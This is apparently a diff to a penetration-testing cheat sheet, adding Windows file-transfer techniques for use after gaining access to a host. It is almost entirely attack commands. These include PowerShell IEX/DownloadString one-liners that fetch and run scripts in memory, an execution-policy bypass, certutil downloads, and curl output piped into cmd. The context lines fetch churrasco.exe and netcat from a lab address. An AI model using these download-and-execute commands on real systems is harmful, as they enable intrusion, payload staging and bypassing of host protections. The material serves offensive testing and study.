@@ -72,3 +72,53 @@ cscript /nologo wget.vbs http://10.10.14.147/churrasco.exe churrasco.exe
 cscript /nologo wget.vbs http://10.10.14.147/nc32.exe nc32.exe
 
 ```
+
+
+
+### PowerShell Cmdlet (Powershell 3.0 and higher)
+```
+Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"
+PowerShell One-Liner
+
+(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 
+PowerShell One-Line Script Execution in Memory
+
+IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
+PowerShell with Proxy
+
+$browser = New-Object System.Net.WebClient;
+$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+IEX($browser.DownloadString('https://server/script.ps1'));
+PowerShell Script
+
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://server/file.exe" >>wget.ps1
+echo $file = "output-file.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+		
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+Non-interactive FTP via text file. Useful for when you only have limited command execution.
+
+echo open 10.10.10.11 21> ftp.txt
+echo USER username>> ftp.txt
+echo mypassword>> ftp.txt
+echo bin>> ftp.txt
+echo GET filename>> ftp.txt
+echo bye>> ftp.txt
+		
+ftp -v -n -s:ftp.txt
+CertUtil
+
+certutil.exe -urlcache -split -f https://myserver/filename outputfilename
+Certutil can also be used for base64 encoding/decoding.
+
+certutil.exe -encode inputFileName encodedOutputFileName
+certutil.exe -decode encodedInputFileName decodedOutputFileName
+Starting with Windows 10 1803 (April 2018 Update) the curl command has been implemented which gives another way to transfer files and even execute them in memory. Piping directly into cmd will run most things but it seems like if you have anything other than regular commands in your script, ie loops, if statements etc, it doesn’t run them correctly.
+
+curl http://server/file -o file
+curl http://server/file.bat | cmd
+And with PowerShell
+
+IEX(curl http://server/script.ps1);Invoke-Blah
+```
